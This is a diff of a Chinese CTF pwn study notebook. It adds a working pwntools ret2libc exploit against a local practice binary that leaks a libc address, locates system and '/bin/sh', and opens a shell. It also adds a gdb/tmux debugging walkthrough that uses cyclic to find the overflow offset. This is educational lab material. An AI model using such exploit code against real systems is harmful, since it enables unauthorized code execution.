@@ -2,7 +2,7 @@
 
 
 
-思虑太多就会使人痛苦，入门pwn权当作清晨操练。相信时间，相信新的机遇。
+思虑太多就会使人痛苦，入门pwn权当作清晨操练。
 
 使用seveng0佬的pwn ubuntu16虚拟机做题
 
@@ -17,6 +17,8 @@ https://shell-storm.org/online/Online-Assembler-and-Disassembler/
 系统调用号在线查询链接：https://syscalls.w3challs.com/
 
 arm64查询链接：https://syscall.sh/
+
+libc查询：https://libc.blukat.me/
 
 默认学过汇编且有一定逆向基础，熟悉运用AI辅助。
 
@@ -644,7 +646,7 @@ checksec ./ret2libc3
     PIE:      No PIE (0x8048000)
 ```
 
-NX保护
+有NX保护
 
 ida打开
 
@@ -701,12 +703,152 @@ python setup.py develop
 ```python
 from pwn import *
 from LibcSearcher import LibcSearcher
+
 p=process('/home/seveng0/Desktop/pwn/ret2libc3')
 
 ret2libc3=ELF('/home/seveng0/Desktop/pwn/ret2libc3')
+puts_plt=ret2libc3.plt['puts'] #获取 puts 函数在 PLT 表中的地址
+libc_start_main_got = ret2libc3.got['__libc_start_main'] #获取 __libc_start_main 函数在 GOT 表中的地址
+main=ret2libc3.symbols['main'] #获取 main 函数的地址，用于在泄露地址后返回到 main 函数，重新执行程序
+#symbols 是 ELF 对象的一个属性，它是一个字典，包含了二进制文件中所有符号（函数、变量等）的名称和地址。
+
+payload=flat([b'a'*112,puts_plt,main,libc_start_main_got])
+#puts函数打印获取 __libc_start_main 函数的地址，返回地址为main函数
+p.sendlineafter(b'Can you find it !?',payload)
+
+libc_start_main_addr=u32(p.recv()[0:4]) #接收到的数据转为32位整数
+libc=LibcSearcher('__libc_start_main',libc_start_main_addr)
+#libc.add_condition('puts', puts_addr)
+libcbase=libc_start_main_addr-libc.dump('__libc_start_main')
+#先执行到这，匹配到多个版本，手动选择1: ubuntu-glibc (id libc6_2.23-0ubuntu11.3_i386)
+
+
+#计算libc基地址 libcbase = 泄露的函数地址 - 该函数在 libc 中的偏移量
+system_addr=libcbase+libc.dump('system') 
+#计算 system 函数的真实地址：system_addr = libcbase + libc.dump('system')。
+binsh_addr=libcbase+libc.dump('str_bin_sh') #计算字符串 "/bin/sh" 的真实地址
+
+payload=flat([b'a'*104,system_addr,b'b'*4,binsh_addr])
+
+p.sendline(payload)
+p.interactive()
+```
+
+
+
+找不到符合的libc库
+
+![image-20250219002401813](./ctf-wiki-pwn-learning.assets/image-20250219002401813.png)
+
+
+
+下载`https://github.com/niklasb/libc-database`的压缩包，解压改名后拖到虚拟机中替换原本的`libc-database`
+
+![image-20250220235846298](./ctf-wiki-pwn-learning.assets/image-20250220235846298.png)
+
+下载 Ubuntu 系统的 libc（C 标准库）相关的文件。
+
+```
+root@ubuntu:/home/seveng0/LibcSearcher/libc-database# apt-get install zstd
+root@ubuntu:/home/seveng0/LibcSearcher/libc-database# ./get
+root@ubuntu:/home/seveng0/LibcSearcher/libc-database# ./get ubuntu
+```
+
+
+
+![image-20250220235705149](./ctf-wiki-pwn-learning.assets/image-20250220235705149.png)
+
+
+
+等一会(这玩意下完可能要一天，见好就收)，然后再次尝试
+
+![image-20250221004613170](./ctf-wiki-pwn-learning.assets/image-20250221004613170.png)
+
+
+
+
+
+### 8. 附加调试，tmux，填充大小
+
+需要解答一个问题：为什么ret2libc3第二次payload要填充104个a？
+
+
+
+下载`tmux`终端多路复用器
+
+```bash
+sudo apt-get install tmux
+```
+
+tmux常见快捷键和命令
+
+```bash
+前缀键
+    `Ctrl + b`：默认的前缀键，所有快捷键都需要先按这个组合键。
+会话操作
+    `Ctrl + b d`：分离当前会话（detach）。tmux detach
+    `Ctrl + b s`：列出所有会话（sessions）。tmux ls
+    `Ctrl + b $`：重命名当前会话。tmux rename-session -t <old_name> <new_name>
+    tmux new -s <session_name>	创建一个新会话并指定名称。
+    tmux attach -t <session_name>	连接到指定会话。
+	tmux kill-session -t <session_name>	关闭指定会话。
+窗口操作
+    `Ctrl + b c`：创建新窗口（create）。tmux new-window -n <window_name>
+    `Ctrl + b w`：列出所有窗口（windows）。tmux list-windows
+    `Ctrl + b n`：切换到下一个窗口（next）。
+    `Ctrl + b p`：切换到上一个窗口（previous）。
+    `Ctrl + b &`：关闭当前窗口。
+    `Ctrl + b ,`：重命名当前窗口。tmux rename-window <new_name>
+    tmux select-window -t <window_number>	切换到指定编号的窗口。
+    tmux kill-window -t <window_number>	关闭指定窗口。
+面板操作
+    `Ctrl + b %`：垂直分割面板（split vertically）（上下布局）。tmux split-window -v
+    `Ctrl + b "`：水平分割面板（split horizontally）。tmux split-window -h
+    `Ctrl + b o`：切换到下一个面板（other）。
+    `Ctrl + b ;`：在最近使用的两个面板之间切换。
+    `Ctrl + b x`：关闭当前面板。
+    `Ctrl + b z`：最大化/恢复当前面板（zoom）。
+    `Ctrl + b 方向键`：调整当前面板的大小。(需要把NumLock关了)
+    tmux select-pane -U	切换到上方面板。
+    	-D/-L/-R 下方/左方/右方
+    tmux swap-pane -U	将当前面板与上方面板交换。
+    	-D/-L/-R 下方/左方/右方
+    tmux resize-pane -L 10 将当前面板向左调整 10 个单位宽度
+    	-D/-L/-R 下/左/右
+其他操作
+    `Ctrl + b [`：进入复制模式，可以使用方向键滚动和选择文本。
+    `Ctrl + b ]`：粘贴复制的文本。
+    `Ctrl + b t`：显示时钟。
+    `Ctrl + b ?`：显示所有快捷键帮助。
+    tmux list-keys	列出所有快捷键绑定。
+	tmux list-commands	列出所有支持的命令。
+	tmux start-server 	启动tmux服务器
+	tmux kill-server	关闭所有会话和 tmux 服务器。(用这个命令会导致一些奇怪问题)
+```
+
+
+
+进终端输入`tmux`启用一个tmux会话
+
+
+
+```python
+from pwn import *
+from LibcSearcher import LibcSearcher
+
+# 设置终端环境为 tmux 分屏
+context.terminal=['tmux', 'splitw', '-h']
+
+p=process('/home/seveng0/Desktop/pwn/ret2libc3')
+gdb.attach(proc.pidof(p)[0],"""
+	break *gets
+	continue
+""")#gdb附加调试至主进程
+
+ret2libc3=ELF('/home/seveng0/Desktop/pwn/ret2libc3')
 puts_plt=ret2libc3.plt['puts']
-libc_start_main_got = ret2libc3.got['__libc_start_main']
-main=ret2libc3.symbols['main']
+libc_start_main_got = ret2libc3.got['__libc_start_main'] 
+main=ret2libc3.symbols['main'] 
 
 payload=flat([b'a'*112,puts_plt,main,libc_start_main_got])
 p.sendlineafter(b'Can you find it !?',payload)
@@ -714,22 +856,51 @@ p.sendlineafter(b'Can you find it !?',payload)
 libc_start_main_addr=u32(p.recv()[0:4])
 libc=LibcSearcher('__libc_start_main',libc_start_main_addr)
 libcbase=libc_start_main_addr-libc.dump('__libc_start_main')
-system_addr=libcbase+libc.dump('system')
-binsh_addr=libcbase+libc.dump('str_bin_sh')
 
-payload=flat([b'a'*104,system_addr,b'b'*4,binsh_addr])
+#手动选择1: ubuntu-glibc (id libc6_2.23-0ubuntu11.3_i386)
+```
+
+如下图，光标会聚焦右边屏幕gdb部分
+
+![image-20250221190326539](./ctf-wiki-pwn-learning.assets/image-20250221190326539.png)
+
+按`ctrl+b+o`切换窗格，输入`1`手动选择glibc库
+
+![image-20250221190355456](./ctf-wiki-pwn-learning.assets/image-20250221190355456.png)
+
+
+
+```python
+payload=cyclic(200)
 p.sendline(payload)
+```
+
+`ctrl+b+o`切换回gdb面板，输入`continue`
+
+可以看到返回地址被覆盖成了`0x62616162`
+
+![image-20250221130336957](./ctf-wiki-pwn-learning.assets/image-20250221130336957.png)
+
+计算出偏移量为 104，这意味着在返回地址之前需要填充 104 个字节的垃圾数据。
+
+```bash
+pwndbg> cyclic -l 0x62616162
+104 
 ```
 
 
 
-![image-20250219002401813](./ctf-wiki-pwn-learning.assets/image-20250219002401813.png)
-
-寄了，等明天
 
 
+### 9. ret2csu
 
 
 
-### 8. 
+
+
+
+
+
+
+
 
